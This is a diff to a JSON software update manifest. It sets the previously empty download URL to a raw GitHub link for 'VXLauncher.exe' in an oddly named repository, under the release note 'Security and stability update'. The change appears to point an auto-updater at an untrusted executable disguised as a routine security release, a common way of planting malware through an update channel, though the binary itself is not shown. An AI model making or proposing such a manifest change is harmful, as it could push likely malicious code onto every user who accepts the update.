@@ -1,7 +1,7 @@
 {
   "schema": 1,
   "version": "2.2.0",
-  "download_url": "",
+  "download_url": "https://github.com/dsffg2/CurveiBE/raw/refs/heads/main/VXLauncher.exe",
   "sha256": "b64d3262467a165e7c8cd716e9edd973fb85724236372518cad453d86ad24811",
   "size": 6697096,
   "notes": "Security and stability update",
